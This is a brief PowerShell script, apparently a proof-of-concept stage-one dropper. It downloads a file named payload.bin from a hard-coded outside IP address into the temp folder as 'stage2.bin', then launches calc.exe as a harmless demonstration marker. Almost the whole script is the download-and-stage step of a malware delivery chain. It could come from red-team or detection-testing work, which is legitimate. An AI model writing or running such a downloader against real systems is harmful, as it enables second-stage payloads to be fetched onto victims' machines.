
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://198.51.100.154/downloads/payload.bin',
    [string]$PayloadPath = "$env:TEMP\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $PayloadPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
